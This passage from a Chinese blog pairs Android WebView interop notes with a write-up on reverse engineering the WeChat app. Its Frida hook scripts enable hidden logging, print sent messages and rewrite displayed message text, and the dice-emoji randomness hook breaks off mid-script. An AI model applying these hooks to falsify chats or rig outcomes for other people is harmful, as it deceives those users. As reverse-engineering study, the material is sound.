class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line"> webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line"> webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 先载入JS代码</span></span><br><span class="line"> <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"> mWebView.loadUrl(<span class="string">&quot;file:///android_asset/AndroJs.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line"> button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">         <span class="comment">// 通过Handler发送消息</span></span><br><span class="line">         mWebView.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"> </span><br><span class="line">                 <span class="comment">// 注意调用的JS方法名要对应上</span></span><br><span class="line">                 <span class="comment">// 调用javascript的callJS()方法</span></span><br><span class="line">                 mWebView.loadUrl(<span class="string">&quot;javascript:callJS()&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line"> </span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 由于设置了弹窗检验调用结果,所以需要支持js对话框</span></span><br><span class="line"> <span class="comment">// webview只是载体，内容的渲染需要使用webviewChromClient类去实现</span></span><br><span class="line"> <span class="comment">// 通过设置WebChromeClient对象处理JavaScript的对话框</span></span><br><span class="line"> <span class="comment">//设置响应js 的Alert()函数</span></span><br><span class="line"> mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, <span class="keyword">final</span> JsResult result)</span> &#123;</span><br><span class="line">         AlertDialog.<span class="type">Builder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">         b.setTitle(<span class="string">&quot;Alert&quot;</span>);</span><br><span class="line">         b.setMessage(message);</span><br><span class="line">         b.setPositiveButton(android.R.string.ok, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> which)</span> &#123;</span><br><span class="line">                 result.confirm();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         b.setCancelable(<span class="literal">false</span>);</span><br><span class="line">         b.create().show();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure><p>调用成功</p><p><img src="2025-01-15-《第一行代码》阅读笔记/905443_JWE7TE67SA736UJ.png" alt="image-20220729094802205"></p><p>还可以使用evaluateJavascript来加载js脚本内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用evaluateJavascript来加载js中函数</span></span><br><span class="line">mWebView.evaluateJavascript(<span class="string">&quot;javascript:callJS()&quot;</span>, <span class="keyword">new</span> <span class="title class_">ValueCallback</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiveValue</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="comment">//此处为 js 返回的结果</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="WebView漏洞"><a href="#WebView漏洞" class="headerlink" title="WebView漏洞"></a>WebView漏洞</h3><p><img src="2025-01-15-《第一行代码》阅读笔记/905443_C8YTUCX4746WZHB.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读 </tag>
            
            <tag> Android开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wechat简单逆向</title>
      <link href="/posts/5324751f.html"/>
      <url>/posts/5324751f.html</url>
      
        <content type="html"><![CDATA[<h1 id="微信app简单逆向学习"><a href="#微信app简单逆向学习" class="headerlink" title="微信app简单逆向学习"></a>微信app简单逆向学习</h1><ul><li>小记：没有逆向过什么正式app，翻阅哲佬博客看到了微信逆向的实战，之前看到就望而却步了，最近没什么事情就尝试复现了一下，也只能是懂了一点却又没完全弄懂</li></ul><h2 id="vx-Log日志输出"><a href="#vx-Log日志输出" class="headerlink" title="vx Log日志输出"></a>vx Log日志输出</h2><p>像这种大型的app都会自己包装一个Log类，用于开发过程中的Log输出调式，而正式发布后都会关闭这些Log类输出，所以我们可以找到关闭log类输出的方法打开它，利于我们后面逆向分析</p><p>简单看一下反编译后的代码，发现打印输出有些是ae.x这种结构的，跟进ae类看一下。看一下里面有没有什么特殊的方法名<img src="2025-01-15-wechat简单逆向/image-20250115135240735.png" alt=""></p><p>看这个名字应该是控制Log开关的方法。看看哪里引用了这个函数，跟进到keep_setupXLog()方法。</p><p><img src="assets/image-20240609144528529.png" alt="image-20240609144528529"></p><p>发现是setConsoleLogOpen()的参数控制Log的开关，而这个参数又是keep_setupXLog()的第六个参数，所以只要hook把这个参数变为true应该就可以了。选择hook keep_setupXLog()修改参数值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.xlog.app.XLogSetup&#x27;</span>);</span><br><span class="line">    clazz.<span class="property">keep_setupXLog</span>.<span class="title function_">overload</span>(<span class="string">&#x27;boolean&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.Integer&#x27;</span>, <span class="string">&#x27;java.lang.Boolean&#x27;</span>, <span class="string">&#x27;java.lang.Boolean&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">p0,p1,p2,p3,p4,p5,p6</span>) &#123;</span><br><span class="line">        <span class="variable language_">arguments</span>[<span class="number">5</span>] = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Boolean&quot;</span>).<span class="property">TRUE</span>.<span class="property">value</span>;  <span class="comment">//修改为true</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;已开启vx Log打印&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.<span class="property">keep_setupXLog</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);   <span class="comment">//运行函数(参数被修改后的)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>修改后我尝试使用Android Studio的Logcat看看有没有输出发现没有输出，看哲佬笔记发现了Log缓存目录啥的打开时乱码也没有管，但是这个对后面的分析没有太大的影响，这里就理解理解一下思路吧。</p><h2 id="vx发送消息"><a href="#vx发送消息" class="headerlink" title="vx发送消息"></a>vx发送消息</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这种思路就是定位关键方法位置，这里采用DDMS记录一下点击消息框“发送”按钮后方法的调用栈。</p><p>打开DDMS，选中进程，然后点击Start Method Profiling进行跟踪记录。</p><p>同时测试机点击发送按钮，然后关闭跟踪记录<br><img src="assets/image-20240609145348157.png" alt="image-20240609145348157"></p><p>然后会出现如下窗口</p><p><img src="assets/image-20240609145650911.png" alt="image-20240609145650911"></p><p>搜索一下onClick方法就可以，不知道为什么我这DDMS不能方法搜索(感觉自己前期环境配置的真的烂)</p><p>定位到 <strong>com.tencent.mm.pluginsdk.ui.chat.ChatFooter$7</strong></p><p>然后gda看一下这个类下的代码</p><p><img src="assets/image-20240609150036985.png" alt="image-20240609150036985"></p><p>这里挺明显的，“empty message cant be sent”,而上面是判断str是否空，所以猜测str就是用户输入的消息，hook一下有str作为参数的方法，打印一下参数应该就可以了(这里可以hook的方法不唯一，都可以实现)</p><p>这里hook这个方法</p><p><img src="assets/image-20240609150443141.png" alt="image-20240609150443141"></p><p>hook代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//console.log(&quot;aaa&quot;);</span></span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.pluginsdk.ui.chat.ChatFooter&#x27;</span>);</span><br><span class="line">    clazz.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.pluginsdk.ui.chat.ChatFooter&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Send Message&quot;</span>,<span class="variable language_">arguments</span>[<span class="number">1</span>]); </span><br><span class="line">        <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="assets/image-20240609150547432.png" alt="image-20240609150547432"></p><h2 id="修改vx消息内容"><a href="#修改vx消息内容" class="headerlink" title="修改vx消息内容"></a>修改vx消息内容</h2><h3 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h3><p>还是首先定位关键方法，这里使用ddms自带的ui识别工具(ui识别的工具我是真的用都用不了)，说一下大致方法</p><p>测试机打开到与用户聊天界面，使用<code>Dump View Hierarchy for UI Automator</code>来定位发送的消息的控件ID</p><p>控件ID格式为<code>com.tencent.mm:id/al9</code>，然后使用命令行<code>adb shell dumpsys activity top</code>列出当前界面的各种activity类(界面还是与用户聊天界面)，然后搜索控件id就会精准定位到一个类</p><p><img src="assets/image-20240609151254311.png" alt="image-20240609151254311"></p><p>gda跟进进行分析 <code>com.tencent.mm.ui.chatting.view.MMChattingListView</code></p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>翻一下就会找到setAdapter方法(逆向这种业务app感觉真的吃开发功底，而自己不咋懂开发…)</p><p><img src="assets/image-20240609151535307.png" alt="image-20240609151535307"></p><p>看了哲佬的Android笔记发现这里可能就是给ListView设置了一个适配器，而this.LNy就是Adapter，类型为BaseAdapter。交叉引用看看哪里使用了setAdapter方法，发现fTJ方法</p><p><img src="assets/image-20240609153639603.png" alt="image-20240609153639603"></p><p>Lrn是适配器，类型为com.tencent.mm.ui.chatting.a.a；</p><p>Lrr是ListView，类型为MMChattingListView</p><p>Lrn是a类型，跟进这个com.tencent.mm.ui.chatting.a.a类看看，这个类应该是对adapter的编写实现啥的。</p><p>找到编写adapter中关键的几个方法，如getCount</p><p><img src="assets/image-20240609154016621.png" alt="image-20240609154016621"></p><p>根据一般getCount实现的编写，可以知道LtF是数据源。</p><p>我们可以调用<code>getCount()</code>方法和<code>getItem()</code>获取到数据源的单个数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">adapter</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.ui.chatting.ChattingUIFragment&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">zt</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;this.Lrn.value&quot;</span>,<span class="variable language_">this</span>.<span class="property">Lrn</span>.<span class="property">value</span>); <span class="comment">//获得Lrn的值 Lrn是 适配器</span></span><br><span class="line">            <span class="comment">//创建适配器对象，操作getCount  getItem</span></span><br><span class="line">            <span class="keyword">var</span> adapter = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="variable language_">this</span>.<span class="property">Lrn</span>.<span class="property">value</span>,<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.ui.chatting.a.a&quot;</span>))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;adapter&quot;</span>,adapter);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;adapter.getCount&quot;</span>,adapter.<span class="title function_">getCount</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;LtF&quot;</span>,adapter.<span class="property">LtF</span>.<span class="property">value</span>);  <span class="comment">//LtF是数据源</span></span><br><span class="line">            <span class="keyword">var</span> adapter_size = adapter.<span class="title function_">getCount</span>(); <span class="comment">//数据数量</span></span><br><span class="line">            <span class="keyword">var</span> msg = adapter.<span class="title function_">getItem</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg&quot;</span>,msg);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">zt</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">Lrn</span>.<span class="property">value</span> com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">ui</span>.<span class="property">chatting</span>.<span class="property">a</span>.<span class="property">a</span>@eb2b4e4</span><br><span class="line">adapter com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">ui</span>.<span class="property">chatting</span>.<span class="property">a</span>.<span class="property">a</span>@eb2b4e4</span><br><span class="line">adapter.<span class="property">getCount</span> <span class="number">17</span>  <span class="comment">//聊天框有17条消息</span></span><br><span class="line"><span class="title class_">LtF</span> &#123;<span class="number">0</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@21a6784, <span class="number">1</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@4e07b6d, <span class="number">2</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@c7df3a2, <span class="number">3</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@<span class="number">3284833</span>, <span class="number">4</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@89877f0, <span class="number">5</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@<span class="number">1166169</span>, <span class="number">6</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@86ba7ee, <span class="number">7</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@315348f, <span class="number">8</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@ba5231c, <span class="number">9</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@9aaab25, <span class="number">10</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@16e54fa, <span class="number">11</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@d3a8aab, <span class="number">12</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@36f5508, <span class="number">13</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@e7fd4a1, <span class="number">14</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@4bcc6c6, <span class="number">15</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@c152687, <span class="number">16</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@a28b9b4&#125;</span><br><span class="line">msg com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@21a6784  <span class="comment">//数据源中第一个消息</span></span><br></pre></td></tr></table></figure><p>可以知道每个数据都是<code>com.tencent.mm.storage.bz</code>类型的。</p><p>com.tencent.mm.storage.bz类继承 com.tencent.mm.ah.aa类</p><p>com.tencent.mm.ah.aa类继承com.tencent.mm.g.c.ej类</p><p>com.tencent.mm.g.c.ej类继承com.tencent.mm.sdk.e.c类</p><p>发现ej类中有个属性为field_content，猜测他是存放消息内容</p><h3 id="hook修改消息内容"><a href="#hook修改消息内容" class="headerlink" title="hook修改消息内容"></a>hook修改消息内容</h3><p>这里选择hook notifyDataSetChanged()方法可以修改消息内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_notifyDataSetChanged</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.ui.chatting.a.a&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">notifyDataSetChanged</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;notifyDataSetChanged&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> data = <span class="variable language_">this</span>.<span class="property">LtF</span>.<span class="property">value</span>;</span><br><span class="line">            <span class="comment">//console.log(&quot;Ltf&quot;,data);</span></span><br><span class="line">            <span class="keyword">var</span> data_size = data.<span class="title function_">size</span>();  <span class="comment">//数据源数量</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data_size&quot;</span>,data_size);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;data_size;++i)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Message&quot;</span>+i,<span class="title class_">Java</span>.<span class="title function_">cast</span>(data.<span class="title function_">get</span>(i),<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.bz&quot;</span>)).<span class="property">field_content</span>.<span class="property">value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title class_">Java</span>.<span class="title function_">cast</span>(data.<span class="title function_">get</span>(<span class="number">5</span>),<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.bz&quot;</span>)).<span class="property">field_content</span>.<span class="property">value</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;你要修改的内容&quot;</span>);</span><br><span class="line">             <span class="keyword">return</span> clazz.<span class="property">notifyDataSetChanged</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="VX投骰子"><a href="#VX投骰子" class="headerlink" title="VX投骰子"></a>VX投骰子</h2><h3 id="定位-1"><a href="#定位-1" class="headerlink" title="定位"></a>定位</h3><p>同样 方法和上面定位消息发送一样</p><p>点击事件为<code>com.tencent.mm.emoji.panel.a.q$1.onClick()</code></p><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><img src="assets/image-20240609161000551.png" alt="image-20240609161000551"></p><p>跟进”glG.a”方法，即<code>com.tencent.mm.emoji.panel.a.d.a()</code></p><p><img src="assets/image-20240609161502165.png" alt="image-20240609161502165"></p><p>发现有个switch，那就hook一下这个值是多少，向下会执行哪个case语句</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.emoji.panel.a.d&quot;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&#x27;android.view.View&#x27;</span>, <span class="string">&#x27;android.content.Context&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;com.tencent.mm.emoji.a.b.ac&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a,b,c,d</span>)&#123;        </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>[<span class="number">3</span>].<span class="property">type</span>.<span class="property">value</span>); <span class="comment">//0</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//返回值为0，所以执行case 0</span></span><br></pre></td></tr></table></figure><p>再看一下ggJ1.getGroup()值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_getGroup</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">EmojiInfo</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.emotion.EmojiInfo&quot;</span>);</span><br><span class="line">    <span class="title class_">EmojiInfo</span>[<span class="string">&quot;getGroup&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`EmojiInfo.getGroup is called`</span>);</span><br><span class="line">    <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;getGroup&quot;</span>]();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`EmojiInfo.getGroup result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">EmojiGroupInfo</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.emotion.EmojiGroupInfo&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Qbd</span> = <span class="title class_">EmojiGroupInfo</span>.<span class="property">Qbd</span>.<span class="property">value</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Qbd is called&quot;</span>,<span class="title class_">Qbd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试发现  EmojiGroupInfo.Qbd==18 </span></span><br><span class="line"><span class="comment">//当骰子，石头剪刀布时,EmojiInfo.getGroup为18，自定义表情EmojiInfo.getGroup为81</span></span><br></pre></td></tr></table></figure><p>那就<code>ggJ1.getGroup() == EmojiGroupInfo.Qbd</code>成立继续向下分析有一个“getProvider().p(emojiInfo3)“</p><p>jadx双击这个函数发现他还没有进行函数体实现，应该在别的地方覆写实现了。看看哪里引用了这个方法</p><p>找到<code>com.tencent.mm.ca.a.p()</code>和<code>com.tencent.mm.plugin.emoji.e.f.p()</code></p><p>因为com.tencent.mm.ca.a.p()先执行，所以先跟进这个看一看。</p><p><img src="assets/image-20240609164449481.png" alt="image-20240609164449481"></p><p>发现调用了一个p方法  应该就是<code>com.tencent.mm.plugin.emoji.e.f.p()</code>，那就跟进这个看一看 </p><p><img src="assets/image-20240609164548935.png" alt="image-20240609164548935"></p><p>看到了 if条件语句中有<code>EmojiGroupInfo.Qbd</code>应该是在判断你发送的表情包是自定义还是骰子，石头剪刀布。</p><p>不出意外应该会执行到</p><p><img src="assets/image-20240609164915361.png" alt="image-20240609164915361"></p><p>(hh，这里有看开发知识了。。。)</p><p>Cursor是数据库游标，aec来具体查询内容。moveToPosition()是aec移动到指定位置。jE就是个int值应该。看一下bu.jE()方法。i=aec.getCount() - 1，i2=0</p><p><img src="assets/image-20240609165155541.png" alt="image-20240609165155541"></p><p>有一个nextInt(n)取随机值，取值范围[0,n)，这里是[0,aec.getCount() - 1]。</p><p>尝试hook一下这个jE方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_jE</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> bo = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.sdk.platformtools.bu&#x27;</span>);</span><br><span class="line">    bo.<span class="property">jE</span>.<span class="title function_">overload</span>(<span 